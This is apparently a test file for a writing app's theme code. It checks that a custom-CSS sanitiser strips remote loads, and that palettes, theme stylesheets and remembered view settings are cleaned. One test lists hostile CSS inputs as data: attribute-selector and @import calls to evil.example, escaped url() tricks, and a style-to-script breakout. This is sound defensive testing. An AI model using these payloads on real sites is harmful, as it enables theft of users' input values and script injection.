import { describe, expect, test } from "bun:test";
import { cleanShell, cleanViews } from "@/lib/shell-prefs";
import { accents, cleanCss, cleanTheme, palettes, themeCss, themeScript } from "@/lib/themes";

// Themes and what views remember (beat-the-competitors.md, step 7).

describe("custom CSS", () => {
  test("can't load anything from elsewhere", () => {
    const evil = [
      "input[value^='a'] { background: url(https://evil.example/a) }",
      "@import 'https://evil.example/x.css';",
      "div { background: URL ( //evil.example ) }",
      "div { background: u\\72l(https://evil.example) }",
      "div { background-image: image-set('https://evil.example/a.png' 1x) }",
      "@font-face { font-family: x; src: url(//evil.example/f) }",
      "</style><script>alert(1)</script>",
    ].join("\n");
    const clean = cleanCss(evil);
    expect(clean).not.toMatch(/url\s*\(/i);
    expect(clean).not.toMatch(/@import/i);
    expect(clean).not.toMatch(/image-set\s*\(/i);
    expect(clean).not.toContain("\\");
    expect(clean).not.toMatch(/<\/?\s*style/i);
  });

  test("keeps ordinary CSS as it was", () => {
    const css = "html.dark { --background: #101010; }\n[data-slate-editor] { letter-spacing: 0.01em; background: linear-gradient(#fff, #eee); }";
    expect(cleanCss(css)).toBe(css);
  });

  test("is capped", () => {
    expect(cleanCss("a{}".repeat(10_000)).length).toBeLessThanOrEqual(20_000);
  });
});

describe("themes", () => {
  test("the default palette and accent aren't stored", () => {
    expect(cleanTheme({ palette: "paper", accent: "ember", css: "  " })).toBeUndefined();
    expect(cleanTheme({ palette: "sepia", accent: "blue" })).toEqual({ palette: "sepia", accent: "blue" });
    expect(cleanTheme({ palette: "neon", accent: "plaid" })).toBeUndefined();
  });

  test("the stylesheet outranks the app's own and sets light and dark", () => {
    const css = themeCss({ palette: "sepia", accent: "blue" });
    expect(css).toContain("html:root {");
    expect(css).toContain("html.dark {");
    expect(css).toContain("--background: #f4ecd8;");
    expect(css).toContain(`--ember: ${accents.blue.light};`);
    expect(css).toContain(`--ember: ${accents.blue.dark};`);
    expect(themeCss(undefined)).toBe("");
  });

  test("every palette sets real colours, and the script only ever sets text", () => {
    for (const p of Object.values(palettes)) for (const value of [...Object.values(p.light), ...Object.values(p.dark)]) expect(value).toMatch(/^(#[0-9a-f]{6}|rgb\([\d ./]+\))$/i);
    expect(themeScript).toContain("textContent");
    expect(themeScript).not.toContain("innerHTML");
  });

  test("kept with the person's setup", () => {
    expect(cleanShell({ theme: { palette: "forest", css: "a { color: red }" } }).theme).toEqual({ palette: "forest", css: "a { color: red }" });
  });
});

describe("what views remember", () => {
  test("named settings with short, plain values", () => {
    expect(cleanViews({ "graph.depth": 2, "graph.hiddenKinds": ["folder", 3, "timeline"], "corkboard.size": "l", "outline.sort": "prop:pov:-1", "graph.orphans": false })).toEqual({
      "graph.depth": 2,
      "graph.hiddenKinds": ["folder", "timeline"],
      "corkboard.size": "l",
      "outline.sort": "prop:pov:-1",
      "graph.orphans": false,
    });
    expect(cleanViews({ "no-dot": 1, "a.b": { nested: true }, "x.y": null })).toBeUndefined();
    expect(cleanViews([1, 2])).toBeUndefined();
  });
});
